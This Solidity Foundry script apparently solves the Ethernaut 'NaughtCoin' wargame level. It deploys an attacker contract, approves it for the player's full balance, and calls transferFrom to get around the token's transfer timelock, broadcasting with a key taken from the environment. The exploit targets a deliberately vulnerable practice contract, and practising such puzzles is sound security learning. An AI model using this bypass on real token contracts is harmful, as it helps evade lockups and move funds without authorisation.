// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/NaughtCoin.sol";
import "../lib/forge-std/src/Script.sol";
import "../lib/forge-std/src/console.sol";

contract AttackNaughCoin {
    NaughtCoin public naughtCoin;
    address public owner;

    constructor(address _naughtCoin) {
        naughtCoin = NaughtCoin(_naughtCoin);
        owner = msg.sender;
    }

    function attack() public {
        address player = naughtCoin.player();
        uint256 balance = naughtCoin.balanceOf(player);
        naughtCoin.transferFrom(player, address(this), balance);
    }
}

contract NaughtCoinSolution is Script {
    NaughtCoin naughtCoinInstance = NaughtCoin(payable(0x083B05Fd6D7987bE03474aA548a78a79Eb3356a4));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        AttackNaughCoin attacker = new AttackNaughCoin(address(naughtCoinInstance));
        address player = naughtCoinInstance.player();
        uint256 balance = naughtCoinInstance.balanceOf(player);
        naughtCoinInstance.approve(address(attacker), balance);
        attacker.attack();
        vm.stopBroadcast();
    }
}